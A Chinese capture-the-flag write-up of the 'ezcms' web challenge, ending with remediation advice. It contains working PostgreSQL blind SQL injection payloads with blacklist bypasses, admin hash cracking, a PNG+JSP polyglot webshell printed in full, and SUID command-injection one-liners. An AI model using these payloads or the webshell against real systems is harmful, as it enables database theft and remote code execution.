# 强网杯 ezcms Writeup

- 题目：ezcms（Web，100 分）
- 入口：`nc 101.200.174.245 34855`（HTTP，Spring Boot）
- 最终 flag：

```
flag{8c9ab620-7cf7-4693-985a-17a80b43c09c}
```

> 说明：题目只给了容器地址，没有提供附件；本目录 `attachments/` 放的是解题过程中产生的脚本与证据（SQL 报错页、管理员哈希、flag 回显等）。

---

## 0. 漏洞链总览

```
搜索框 SQL 注入（E'' 反斜杠逃逸 + U& 标识符绕过黑名单）
        ↓ 盲注读库
admins 表 5 个管理员无盐 SHA-256
        ↓ rockyou + 规则爆破
altair / freedom 登录后台
        ↓ 媒体库上传只校验图片内容、不限制扩展名
PNG + JSP 多语言文件上传 → /media/xxx.jsp 被 Tomcat 执行
        ↓ RCE（easycms, uid=1001）
/flag 为 root:root 0400；入口脚本提示要打 SUID helper
        ↓ /usr/local/bin/easycms-restore 存在命令替换注入
$(cat ${PWD:0:1}flag) 以 root 执行，cp 报错回显 → flag
```

---

## 1. 信息收集

### 1.1 指纹

根路径返回服务端渲染页面，404 返回 Spring Boot 默认 JSON：

```json
{"timestamp":"2026-11-01T01:07:55.489+00:00","status":404,"error":"Not Found","path":"/robots.txt"}
```

响应头包含 `Vary: Access-Control-Request-Method`、`Content-Language: en-US`，判断为 Spring Boot（内嵌 Tomcat）。

公开路由：

| 路由 | 说明 |
|---|---|
| `/` `/login` `/register` `/search` `/team` | 前台 |
| `/compose` `/article/{id}` `/logout` | 登录后 |
| `/api/health` `/api/articles` | JSON API |
| `/admin/login` `/admin/dashboard` `/admin/content` `/admin/media` | 控制台 |

注册普通用户后可发布文章，搜索使用 `?q=`：

```
/search?q=hello
```

### 1.2 搜索报错泄露 SQL

搜索输入 `a\'b`（反斜杠 + 单引号）时，页面出现“诊断”页，直接回显失败语句：

```sql
SELECT id, title, summary, author, category
FROM articles
WHERE title ILIKE E'%a\''b%'
ORDER BY id DESC
```

```
SQLSTATE：42601
语句语法错误 (syntax error)
```

关键信息：

1. 后端是 **PostgreSQL**（`ILIKE`、`E'...'`）；
2. 查询是**字符串拼接**，只把 `'` 双写为 `''`；
3. `E'...'` 是 PostgreSQL 的转义字符串，反斜杠仍然生效。

因此 `\` + `'` 会变成 `\''`：

- `\'` 在 E 字符串中表示**字面单引号**；
- 紧随其后的 `'` 提前闭合字符串，后面的内容逃逸成 SQL。

---

## 2. 搜索 SQL 注入

### 2.1 注入点与布尔探针

正常查询：

```sql
SELECT id, title, summary, author, category
FROM articles
WHERE title ILIKE E'%<q>%'
ORDER BY id DESC
```

构造（`q` 的原始值）：

```
\'=(SELECT false)-- 
```

拼接后（`'` 被双写）：

```sql
WHERE title ILIKE E'%\''=(SELECT false)-- %'
ORDER BY id DESC
```

解析：

- `E'%\''` → 字符串内容 `%'`，闭合；
- 剩下 `=(SELECT false)`；
- `-- ` 注释掉模板尾部 `%' ORDER BY id DESC`。

由于 `title ILIKE '%''` 恒为 false，整个条件等价于：

```
false = (SELECT false)  → true  → 返回全部文章
false = (SELECT true)   → false → 返回 0 条
```

实测：

| q | 结果数 |
|---|---|
| `\'=(SELECT false)-- ` | 全部（4 条） |
| `\'=(SELECT true)-- ` | 0 条 |

得到一个稳定的**布尔盲注 oracle**。

### 2.2 WAF 黑名单

站点对输入/语句做了关键字黑名单，命中时返回：

```
语句包含非法字符 (illegal character in statement)
```

实测被拦的 token（大小写不敏感）：

```
<  >  ;  :: 
AND  OR  UNION  IN
CAST  CHR  LIKE  SUBSTRING  SUBSTR  LEFT  RIGHT  ASCII
CONCAT  COALESCE  CASE  THEN  MD5  ENCODE  DECODE
LEAST  GREATEST  SCHEMANAME  TABLENAME
INFORMATION_SCHEMA  PG_TABLES
PG_SLEEP  PG_READ_FILE  PG_LS_DIR
_TO_XML（query_to_xml / table_to_xml 等）
```

放行的 token：

```
SELECT FROM WHERE ORDER BY OFFSET LIMIT IS TRUE FALSE NULL
sign() length() replace() lpad() rpad() format() to_hex()
$$...$$  --  #  /* */
```

### 2.3 U& 标识符转义绕过

PostgreSQL 支持 `U&"..."` 形式的标识符，内部 `\XXXX` 是十六进制码点。黑名单是按原始字符串匹配的，所以把敏感字母转义即可：

| 目标 | 绕过写法 | 说明 |
|---|---|---|
| `substring` | `U&"\0073ubstring"` | `\0073` = `s` |
| `ascii` | `U&"\0061scii"` | `\0061` = `a` |
| `query_to_xml` | `U&"query\005fto_xml"` | `\005f` = `_`（绕 `_to_xml`） |
| `pg_read_file` | `U&"pg\005fread\005ffile"` | `\005f` = `_` |

> `COALESCE` 是 SQL 关键字，不能当普通函数用引号调用；这里改用 `IS TRUE` 处理 NULL：
> `((expr) IS TRUE)`：NULL / false 都得到 false，true 才为 true。

### 2.4 盲注原语

- 比较大小（绕 `<` `>`）：`sign(a - b) = 1` 表示 `a > b`；
- 取长度：`length(value)`；
- 取单字符：`U&"\0061scii"(U&"\0073ubstring"(value, i, 1))`；
- 二分查找即可逐字符读出任意字符串。

最终探针模板：

```
\'=(SELECT (sign(<expr>) = 1) IS TRUE)-- 
```

例子（读 `current_database()` 第 1 个字符是否大于 100）：

```
\'=(SELECT (sign(U&"\0061scii"(U&"\0073ubstring"(current_database(),1,1)) - 100) = 1) IS TRUE)-- 
```

---

## 3. 读库

### 3.1 基础信息

| 项 | 值 |
|---|---|
| `version()` | `PostgreSQL 15.19 (Ubuntu ...)` |
| `current_database()` | `easycms` |
| `current_user` / `session_user` | `cms`（非超级用户） |

`pg_read_file` / `pg_ls_dir` 返回 `42501 insufficient privilege`，DB 层读文件走不通。

### 3.2 表结构

从 `pg_class` / `pg_attribute` 枚举：

```
articles(id, title, summary, author, category, body, created_at)
users(id, username, password_hash, role, created_at)
admins(id, username, password_hash, display_name, title, created_at)
media_assets(id, name, ext, size_bytes, created_at)
```

`users.role` 全为 `user`；没有 flag 表、没有自定义函数、没有 SECURITY DEFINER 函数。

### 3.3 管理员账号

`admins` 共 5 行：

| id | username | display_name | password_hash |
|---|---|---|---|
| 1 | vega | Vega Luo | `1ac7df128e4f666bcfe64ba395b285ec69f54ab5e1fbf67b1a86f3bac77a8c36` |
| 2 | altair | Altair Shen | `13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38` |
| 3 | capella | Capella Qiu | `bc0445a68f9ac5ef6abc67eb1ab3a9d7ca1b727c219ff89c79fd3ac907b7651c` |
| 4 | rigel | Rigel Fang | `24998eacdca975e40ea56aaf0395ff8c5071016f9eae4d1a6a42f25f5db39171` |
| 5 | atlas | Atlas Zeng | `4dfbab9993e5e8a92c6ed29b2f86c1dfef0c5a475de9fc37481253e79a5c029c` |

64 位十六进制 = SHA-256。用自己注册的账号验证：

```
sha256("Passw0rd123")
= fa870a2658fc49993579f7471d86d0a54ca1267e52d3f9be2395d6f3689bdcc7
= users 表中该账号的 password_hash
```

结论：**无盐 SHA-256**。

---

## 4. 后台口令爆破

rockyou（14,344,394 条）+ 常见变形规则（首字母大写、全大写、追加 `1/123/1234/2025/2026/!@#` 等），20 进程本地跑 SHA-256：

```python
sha256("freedom") =
13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38
```

命中：

```
altair : freedom
```

登录：

```http
POST /admin/login
username=altair&password=freedom
→ 302 /admin/dashboard
```

控制台功能：

- `/admin/dashboard`：统计 + 团队
- `/admin/content`：文章列表 / 搜索 / 删除
- `/admin/media`：媒体库（图片上传）
- `/admin/content/delete`：POST 删除
- `/admin/media/upload`：POST 上传

---

## 5. 上传 JSP 拿 RCE

### 5.1 上传逻辑

媒体库只允许“图片”，服务端用 Java `ImageIO` 解码校验；错误信息示例：

```
上传失败：Error reading PNG image data
```

但是：

1. 只校验**内容能不能被解码成图片**，不校验扩展名；
2. 文件名做了 basename/字符替换（`../x.png` → `x.png`，`%` → `_`），但扩展名保留；
3. 文件落在 `/usr/local/tomcat/webapps/ROOT/media/`，通过 `/media/{name}` 访问；
4. `.jsp` 会被 Tomcat 的 JSP Servlet 编译执行；
5. 有一个清理任务，非图片资源约 **4–5 秒**后从 DB/磁盘删除。

把合法 PNG 的字节放在文件开头，后面直接拼 JSP 代码，`ImageIO` 读到 `IEND` 就结束，不会管后面的内容。

### 5.2 验证执行

上传 `exec.jsp`，内容：

```
<合法 PNG 字节>[7*7 的 JSP 表达式]
```

立即访问 `/media/exec.jsp`，响应 `Content-Type: text/html`，内容里出现：

```
ZZTOKEN_49
```

说明 JSP 表达式被求值（`7*7=49`），**RCE 成立**。约 5 秒后同一 URL 变成 404（清理任务）。

### 5.3 命令执行 WebShell

JSP（前面拼 PNG 头）：

```jsp
<%
String c = request.getParameter("c");
if (c != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
  java.io.InputStream in = p.getInputStream();
  byte[] buf = new byte[8192]; int n;
  StringBuilder sb = new StringBuilder();
  while ((n = in.read(buf)) > 0) sb.append(new String(buf,0,n));
  java.io.InputStream er = p.getErrorStream();
  while ((n = er.read(buf)) > 0) sb.append(new String(buf,0,n));
  p.waitFor();
  out.println("CMDSTART" + sb.toString() + "CMDEND");
}
%>
```

上传后立刻请求：

```
/media/rce<jsp>?c=<urlencoded command>
```

身份：

```
uid=1001(easycms) gid=1001(easycms) groups=1001(easycms)
```

---

## 6. 提权读 /flag

### 6.1 现场

```
-r-------- 1 root root 42 /flag
```

`easycms` 不可读。入口脚本 `/usr/local/bin/easycms-entrypoint` 里写得很清楚：

> The flag stays root:root 0400 so the webapp still has to escalate
> through the setuid helper.

并发现：

```
-rwsr-xr-x 1 root root 16064 /usr/local/bin/easycms-restore
```

### 6.2 easycms-restore

`strings`：

```
usage: %s <asset>
invalid asset name
restores <asset> from the root backup set into /srv/media
/bin/cp -p /var/backups/media/%s /srv/media/
```

行为：以 SUID root 运行，把用户参数拼进命令，再由 `/bin/bash` 执行：

```bash
/bin/cp -p /var/backups/media/<asset> /srv/media/
```

参数过滤了 `..` 和 `/` 一类的路径穿越，但**没有过滤 shell 元字符**。

直接用 `$(cat /flag)` 会因 `/` 被拦，可以用 bash 参数展开绕开斜杠：

```
${PWD:0:1}   # PWD 第一个字符，即 "/"
```

所以：

```bash
/usr/local/bin/easycms-restore '$(cat ${PWD:0:1}flag)'
```

命令替换在 cp 之前由 root 执行，结果拼进 cp 的源路径；cp 报错把路径打出来：

```
cp: cannot stat '/var/backups/media/flag{8c9ab620-7cf7-4693-985a-17a80b43c09c}': No such file or directory
```

`$(id)` 同样可验证 root：

```
euid=0(root)
```

也可以分号注入直接 cat：

```bash
/usr/local/bin/easycms-restore ';cat ${PWD:0:1}flag;'
```

输出：

```
flag{8c9ab620-7cf7-4693-985a-17a80b43c09c}
```

### 6.3 交叉验证

base64：

```
ZmxhZ3s4YzlhYjYyMC03Y2Y3LTQ2OTMtOTg1YS0xN2E4MGI0M2MwOWN9
→ flag{8c9ab620-7cf7-4693-985a-17a80b43c09c}
```

文件大小 42 字节，与 `/flag` 的 `stat` 一致。

---

## 7. Flag

```
flag{8c9ab620-7cf7-4693-985a-17a80b43c09c}
```

---

## 8. 修复建议

1. **SQL 注入**：全部改预编译参数化查询；不要用 `E'...'` + 手工把 `'` 双写来“防注入”；不要向前端回显失败 SQL/错误页。
2. **黑名单 WAF 不是修复**：`U&"..."` 只是其中一种绕过；正确做法是参数化 + 最小权限。
3. **后台口令**：禁止弱口令，管理员密码使用强随机值并加盐慢哈希（bcrypt/argon2）；加登录限速/锁定/2FA。
4. **上传**：同时校验扩展名白名单 + magic + 重编码图片；随机化文件名；上传目录移出 webroot；禁止该目录解析 JSP；`Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`。
5. **清理任务不能当安全边界**：5 秒窗口足够完成 RCE。
6. **SUID helper**：不要把用户参数拼进 shell；使用 `execve` 固定 argv；严格白名单；能不用 SUID 就不用。
7. **flag 权限**：root 0400 是对的，但 SUID helper 把它绕过了；helper 需要最小化、审计。

---

## 9. 附件

`attachments/`：

| 文件 | 内容 |
|---|---|
| `sql_error_sample.html` | 搜索报错诊断页原始 HTML（泄露 SQL） |
| `admins.txt` | 5 个管理员用户名/哈希与破解结果 |
| `flag.txt` | 最终 flag |
| `cp_error_flag_evidence.txt` | SUID helper 回显 flag 的证据 |
| `jsp_payload.bin` | PNG + JSP 命令执行载荷（可直接上传） |
| `exp_ezcms.py` | 完整复现脚本（盲注 / 爆破 / 后台 / RCE / flag） |

复现：

```bash
python exp_ezcms.py --target http://101.200.174.245:34855 --stage extract
python exp_ezcms.py --stage crack --wordlist rockyou.txt
python exp_ezcms.py --stage admin --user altair --password freedom
python exp_ezcms.py --stage rce --cmd id
python exp_ezcms.py --stage flag
```
